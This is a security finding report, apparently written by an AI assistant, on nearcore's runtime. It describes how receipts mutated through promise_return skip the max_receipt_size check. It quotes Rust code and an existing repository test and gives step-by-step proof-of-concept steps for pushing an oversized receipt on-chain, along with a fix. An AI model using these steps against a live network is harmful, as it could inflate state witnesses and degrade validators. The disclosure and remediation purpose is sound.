Based on my research, I found a documented but still-present analog in nearcore that matches the external bug class exactly: a limit enforced during creation but bypassed during processing.

---

### Title
Inconsistent `max_receipt_size` Enforcement: Size Checked on Creation but Skipped on Processing via `promise_return` — (File: `runtime/runtime/src/verifier.rs`, `runtime/runtime/src/lib.rs`)

### Summary
`validate_receipt` enforces `max_receipt_size` only in `NewReceipt` mode. When a contract uses `promise_return`, the runtime mutates the returned receipt by appending `output_data_receivers` after it was already validated, potentially pushing it above the 4 MB limit. The receipt is then processed in `ExistingReceipt` mode, which unconditionally skips the size check, allowing receipts larger than `max_receipt_size` to be executed on-chain.

### Finding Description
In `runtime/runtime/src/verifier.rs`, `validate_receipt` gates the size check on the mode:

```rust
if mode == ValidateReceiptMode::NewReceipt {
    let receipt_size: u64 = borsh::object_length(receipt)...;
    if receipt_size > limit_config.max_receipt_size {
        return Err(ReceiptValidationError::ReceiptSizeExceeded { ... });
    }
}
``` [1](#0-0) 

`ExistingReceipt` mode is explicitly documented as intentionally less strict, but the comment acknowledges a known bug:

> "There is a bug which allows to create receipts that are above the size limit. Runtime has to handle them gracefully until the receipt size limit bug is fixed. See https://github.com/near/nearcore/issues/12606" [2](#0-1) 

The mutation that causes the size overflow occurs in `apply_action_receipt`. When a function call returns a `ReceiptIndex` via `promise_return`, the runtime appends `output_data_receivers` from the current receipt directly onto the returned receipt **after** it was validated as a new receipt:

```rust
new_action_receipt.output_data_receivers
    .extend_from_slice(&action_receipt.output_data_receivers()),
``` [3](#0-2) 

The mutated receipt is then forwarded and later processed in `ExistingReceipt` mode, which skips the size check entirely.

The test `test_max_receipt_size_promise_return` explicitly confirms this behavior is present and unresolved:

> "The receipt should be rejected, but currently isn't because of a bug (See https://github.com/near/nearcore/issues/12606)" [4](#0-3) 

### Impact Explanation
An unprivileged user can deploy a contract that:
1. Creates a receipt with `args` sized so the total receipt is exactly `max_receipt_size` (4,194,304 bytes) — passes `NewReceipt` validation
2. Uses `promise_return` to return this receipt while the outer receipt has at least one `output_data_receiver`
3. The runtime appends the `output_data_receivers` to the returned receipt, pushing it above 4 MB
4. The oversized receipt is forwarded and processed without any size error

The result is that receipts exceeding the 4 MB limit are included in the `ChunkStateWitness` and executed on-chain. This inflates the state witness beyond its designed bounds, constituting a non-network-level denial of service reachable from ordinary user actions (deploy + call), fixable without a hardfork by re-validating receipt size after the `output_data_receivers` mutation.

### Likelihood Explanation
Any user who can deploy a contract (i.e., any NEAR account) can trigger this. The exact receipt size needed is deterministic and computable from the base receipt template. The test in the repository demonstrates the exploit path end-to-end. No privileged role is required.

### Recommendation
After appending `output_data_receivers` to a returned receipt in the `promise_return` path (`runtime/runtime/src/lib.rs` around line 1040–1048), re-validate the receipt size against `max_receipt_size` before forwarding it. Alternatively, account for the size of the parent receipt's `output_data_receivers` when validating the child receipt at creation time, so the combined size never exceeds the limit.

### Proof of Concept
1. Compute `args_size = max_receipt_size − base_receipt_size` (as done in the existing test at `test-loop-tests/src/tests/max_receipt_size.rs` lines 175–177).
2. Deploy a contract that calls `max_receipt_size_promise_return_method1` with `{"args_size": <computed>}`.
3. The contract creates a receipt of exactly `max_receipt_size`, then calls `promise_return` on it.
4. The outer receipt has one `output_data_receiver`; the runtime appends it to the returned receipt, producing a receipt of `max_receipt_size + sizeof(DataReceiver)` bytes.
5. The oversized receipt is processed in `ExistingReceipt` mode with no size error, and the state witness grows beyond the 4 MB receipt bound. [5](#0-4)

#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
